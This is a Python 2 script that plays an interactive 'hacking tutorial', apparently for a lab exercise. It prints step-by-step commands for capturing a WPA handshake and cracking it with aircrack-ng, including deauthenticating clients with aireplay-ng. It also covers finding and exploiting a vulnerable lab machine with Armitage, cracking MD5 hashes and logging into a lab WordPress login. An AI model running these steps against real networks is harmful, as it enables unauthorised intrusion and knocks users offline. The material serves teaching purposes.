#!/usr/bin/python

import Image
import time

def newline():
    time.sleep(10)
    print '\n'

def errorst():
    print ("You must put a yes or no value in")

def files():
    print ("Do you know the next step now that you have access?")
    while tutorial == 'yes':
        answer = raw_input()
        if answer in ['yes', 'y', 'yeah']:
            print ('Alright! Proceed to step 5, then!')
            return
        elif answer in ['no', 'n']:
            print ('Now that you have access to the machine, look around for any files. Type the "ls" command to list the contents of the directory you are in.')
        else:
            errorst()
        print ('Did you find anything?')
        while tutorial == 'yes':
                answer = raw_input()
                if answer in ['yes', 'y', 'yeah']:
                    print ('Great! Open that password file by typing "nano /home/Desktop/passwords.txt"')
                    return
                elif answer in ['no', 'n']:
                    print ('Locate the password dictoinary stored in "home/Desktop/passwords.txt", then open the file by typing "nano /home/Desktop/passwords.txt"')
                    return
                else:
                    errorst()


print ('Hello, and welcome to the first three steps of hacking')
name = raw_input("What is your name? ")
print ("Hi " + name + "! Let's begin!")

tutorial = 'yes'
print ('Are you using wireless or a cabled machine')
while tutorial == 'yes':
    answer = raw_input()
    if answer == str('cabled'):
        print ('Alright! Proceed to the cabled directions, then!')
        break
    elif answer == str('wireless'):
        print ('Enable monitor mode by typing the command "airmong-ng check kill", then type "airmon-ng start wlan0", you can ensure that you are in monitor mode by typing "iwconfig" and seeing what it says your network card is in.')
        print '\n'
        newline()
        print ('Next, see what access points are available by enetering "airodump-ng wlan0mon" and note down the BSSID and Channel <CH> of the access point you are targeting')
        newline()
        print ("It's time to capture the 3-way handshake and write that information to a pcap file for later examination. Type the command 'airodump-ng -c<ch> --bssid<bssid> -w<filename> wlan0mon') Where <ch> is the channel the target access point is running on. <bssid> is the MAC address for the target access point. -w writes to file with the name you give it, in this case crackwpa.")
        newline()
        print ('Please see the opened image for an example')
        print '\n'
        image = Image.open('/root/Desktop/Hack/Terminalwindow.png')
        image.show()
        print ('Now that you are monitoring the target access point only, we need to actually force an authenticated client to disconnect so we can capture that handshake. To do this, take note of the station MAC address from a client on the network, keep your monitoring window open and open a new terminal window. We will then deauthicate a client with the second window')
        newline()
        image = Image.open('/root/Desktop/Hack/airodump.png')
        image.show()
        print ('In your new window enter "aireplay-ng -0 10 -a <bssid> -c <station> wlan0mon" Where: -0 means deauthentication, 10 is the number of deauth attempts, -a is the MAC address of your target access point, and -c is the client you are kicking off the network"')
        image = Image.open('/root/Desktop/Hack/handshake.jpg')
        newline()
        print ('Looking back on the first terminal window where we are monitoring the target access point, you will see on the top that it captured a WPA handshake with a string of numbers and letters after it. We now have all that we need to crack the network password!')
        newline()
        print ('Note, that if you did not capture a handshake, you may need to increase the number of deauths to send in previous step')
        newline()
        print ('Time to crack the password using your pre-installed Kali wordlist')
        newline()
        print ("Enter the following: 'aircrack-ng -w 'usr/share/wordlists/<wordlist>.txt -b <bssid> /directory/*.cap'")
        newline()
        print ('Please see the example image that will open soon')
        image = Image.open('/root/Desktop/Hack/aircrack.png')
        image.show()
        print ('Aircrack will now try to crack the password by matching passwords from your wordlist to the captured handshake. If the password is in the wordlist, it sill say KEY FOUND! [<password>]')
        time.sleep(20)
               
        break
    else:
        print ('Please choose between "wireless" and "cabled"')
      
print ('Do you know the first step in hacking a network?')
while tutorial == 'yes':
    answer = raw_input()
    if answer in ['yes', 'y', 'yeah']:
        print ('Alright! Proceed to step 2, then!')
        break
    elif answer in ['no', 'n']:
        print ('Reconnassaince is first, we need to see what machines are there, try opening Armitage to find the vulnerable machine.')
        newline()
        break
    else:
        errorst()
    
print ('Do you know the second step in hacking a network?')
while tutorial == 'yes':
    answer = raw_input()
    if answer in ['yes', 'y', 'yeah']:
        print ('Alright! Proceed to step 3, then!')
        break
    elif answer in ['no', 'n']:
        print ('Scanning is the next step, use Armitage to find the vulnerable machine and its IP address')
        newline()
        break
    else:
        errorst()
    
print ('Do you know the third step in hacking a network?')
while tutorial == 'yes':
    answer = raw_input()
    if answer in ['yes', 'y', 'yeah']:
        print ('Alright! Proceed to step 4, then!')
        break
    elif answer in ['no', 'n']:
        print ("Gaining access is the third step. Right click the machine, scan for attacks. The attack you're looking for is: ""'vulnerability=IRC-real'""")
        files()
        newline()
        break
    else:
        errorst()
    

print ('Do you know the next step with the hashes you now have?')
while tutorial == 'yes':
    answer = raw_input()
    if answer in ['yes', 'y', 'yeah']:
        print ("Aren't you a pro! Guess I'm not needed here!")
        break
    elif answer in ['no', 'n']:
        print ('Decrypt the found MD5 user name and password hashes using MD5online.org')
        newline()
        break
    else:
        errorst()
        
print ('Do you know how to access the second machine with the found credentials?')
while tutorial == 'yes':
    answer = raw_input()
    if answer in ['yes', 'y', 'yeah']:
        print ("Well do it then!")
        break
    elif answer in ['no', 'n']:
        print ('Login to 192.168.97.63, then explore. Once that is done, log into the provided url that you found in the dictionary file "192.168.97.63/wp-login.php"')
        newline()
        break
    else:
        errorst()

print ('This ends the the exercise, goodbye!')
exit


